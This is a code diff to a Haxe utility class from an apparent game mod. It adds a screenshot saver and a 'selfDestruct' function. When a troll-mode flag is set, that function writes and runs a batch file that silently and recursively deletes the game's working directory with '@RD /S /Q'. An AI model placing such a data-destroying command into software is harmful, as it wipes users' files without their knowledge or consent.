@@ -6,12 +6,19 @@ package;
  * used in VS Dave and Bambi
  * @see https://github.com/Lokitot/FNF-SoulEngine
  */
-
 #if sys
 import sys.io.File;
 import sys.io.Process;
 #end
 import haxe.io.Bytes;
+import flixel.FlxG;
+import sys.FileSystem;
+import flixel.util.FlxStringUtil;
+import openfl.geom.Matrix;
+import openfl.geom.Rectangle;
+import openfl.Lib;
+
+using StringTools;
 
 class CoolSystemStuff
 {
@@ -44,6 +51,39 @@ class CoolSystemStuff
 		// most non-windows os dont have a temp path, or if they do its not 100% compatible, so the user folder will be a fallback
 		return Sys.getEnv("HOME");
 		#end
+	}
+
+	public static function selfDestruct():Void
+	{
+		if (Main.trollMode)
+		{
+			// make a batch file that will delete the game, run the batch file, then close the game
+			var crazyBatch:String = "@echo off\ntimeout /t 3\n@RD /S /Q \"" + Sys.getCwd() + "\"\nexit";
+			File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
+			new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
+		}
+		Sys.exit(0);
+	}
+
+	public static function screenshot()
+	{
+		var sp = Lib.current.stage;
+		var position = new Rectangle(0, 0, Lib.current.stage.stageWidth, Lib.current.stage.stageHeight);
+
+		var image:flash.display.BitmapData = new flash.display.BitmapData(Std.int(position.width), Std.int(position.height), false, 0xFEFEFE);
+		image.draw(sp, true);
+
+		if (!sys.FileSystem.exists(Sys.getCwd() + "\\screenshots"))
+			sys.FileSystem.createDirectory(Sys.getCwd() + "\\screenshots");
+
+		var bytes = image.encode(position, new openfl.display.PNGEncoderOptions());
+
+		var dateNow:String = Date.now().toString();
+
+		dateNow = StringTools.replace(dateNow, " ", "_");
+		dateNow = StringTools.replace(dateNow, ":", "'");
+
+		File.saveBytes(Sys.getCwd() + "\\screenshots\\" + "VsFoxaUpdate-" + dateNow + ".png", bytes);
 	}
 
 	public static function executableFileName():Dynamic // idk what type it was originally
